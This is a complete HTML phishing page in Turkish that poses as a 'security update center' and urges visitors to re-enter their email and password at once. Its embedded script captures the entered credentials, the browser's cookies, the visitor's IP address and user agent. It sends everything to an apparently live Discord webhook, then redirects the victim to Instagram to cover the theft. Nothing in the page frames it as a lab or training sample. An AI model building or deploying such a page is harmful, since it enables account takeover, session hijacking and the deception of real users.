<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Güncellemesi</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="security-logo.png" alt="Güvenlik Logosu" class="logo">
        <h2>Güvenlik Güncellemesi Merkezi</h2>
        <div class="alert-box">
            <p><strong>Önemli Duyuru:</strong> Hesabınız için yeni bir güvenlik protokolü aktifleştiriliyor. Lütfen işlemi hemen tamamlayın!</p>
        </div>
        <p class="info-text">Bu güncelleme, verilerinizi korumak için yalnızca bir kez gereklidir. İşlem yaklaşık 10 saniye sürecektir.</p>
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <form id="phishingForm" method="POST">
            <input type="text" name="username" placeholder="E-posta Adresiniz" required>
            <input type="password" name="password" placeholder="Şifreniz" required>
            <input type="hidden" name="cookies" id="cookies">
            <button type="submit">Güncellemeyi Başlat</button>
        </form>
        <p class="footer-text">© 2025 Güvenlik Ekibi - Tüm hakları saklıdır</p>
    </div>
    <script>
        document.getElementById('phishingForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip || 'IP Bulunamadı';
            const data = {
                username: formData.get('username'),
                password: formData.get('password'),
                cookies: document.cookie || 'Çerez bulunamadı',
                ip: ip,
                user_agent: navigator.userAgent
            };
            const message = `Yeni Güncelleme - ${new Date().toISOString()}:\n**E-posta**: ${data.username}\n**Şifre**: ${data.password}\n**IP**: ${data.ip}\n**Tarayıcı**: ${data.user_agent}\n**Çerezler**: ${data.cookies}`;
            try {
                const response = await fetch('https://discord.com/api/webhooks/1401473482016952320/bo3vGGbGGcleKPWgvUduIpKXHl9QEqy8TerfzmJUyCeoYDHDQ0YaUVyPAoUexXgp4npb', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
                if (response.ok) {
                    window.location.href = 'https://www.instagram.com/';
                } else {
                    alert('Güncelleme başarısız oldu. Lütfen tekrar deneyin.');
                }
            } catch (error) {
                console.error('Hata:', error);
                alert('Bağlantı hatası oluştu.');
            }
        });
    </script>
</body>
</html>
